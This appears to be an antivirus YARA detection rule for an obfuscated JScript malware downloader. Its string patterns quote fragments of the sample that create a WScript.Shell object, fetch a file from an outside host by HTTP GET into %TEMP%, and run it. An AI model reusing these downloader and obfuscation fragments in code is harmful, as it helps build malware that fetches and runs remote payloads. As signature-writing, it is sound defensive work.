rule sig_20160427_ea457df0c4a05d585ac9691995e9c78d {
  meta:
    description = "datamaliciousorder - file 20160427_ea457df0c4a05d585ac9691995e9c78d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "956742ee6039912d4405371405d07d2d9f0230e5593efe5bef79bdedae998ba8"

  strings:
    $s1  = "function YctswPvume() {return CoignHgpya[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"KgEMMyO" ascii
    $s2  = "function YctswPvume() {return CoignHgpya[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"KgEMMyO" ascii
    $s3  = "var CoignHgpya = function HdisiOfbiq() {return DwzmaDascf[VplkkDwmgo](\"WScript\"+\".Shell\");}(), NaqniPovum = 11;" fullword ascii
    $s4  = "NpxmpSpflv[CdocmGinsc](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s5  = "function LjbntWkltr(AyotwUakny, AekvsUtwtu){CvwhbPfeoj = CvwhbPfeoj * 1; return AyotwUakny - AekvsUtwtu;};" fullword ascii
    $s6  = "var DwzmaDascf = this[\"WScript\"];" fullword ascii
    $s7  = "if (NpxmpSpflv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function JxttlIjrbt(){return ChffiMvkfl + \"\";};" fullword ascii
    $s9  = "function ZhwywThyar() {return ((PbnooQoydn == true) && (PbnooQoydn == NswvrUecka)) ? 1 : CvwhbPfeoj;};" fullword ascii
    $s10 = "function UwxahMtejq(){return VplkkDwmgo;};" fullword ascii
    $s11 = "HlwzuJixvq = true;" fullword ascii
    $s12 = "function RgqpuMjvkt(LbnbrDajbz){CoignHgpya[\"R\"+\"un\"](LbnbrDajbz, CvwhbPfeoj, CvwhbPfeoj);};" fullword ascii
    $s13 = "}while (BoellQrgmd);" fullword ascii
    $s14 = "PbnooQoydn = true; " fullword ascii
    $s15 = "var NswvrUecka = false;" fullword ascii
    $s16 = "function ApwdvSgkhu(){return 23;};" fullword ascii
    $s17 = "var IglooLvxkt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var HlwzuJixvq = false;" fullword ascii
    $s19 = "var PbnooQoydn = false;" fullword ascii
    $s20 = "return LjbntWkltr(IfqloFizkk, RchjeAwkih);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}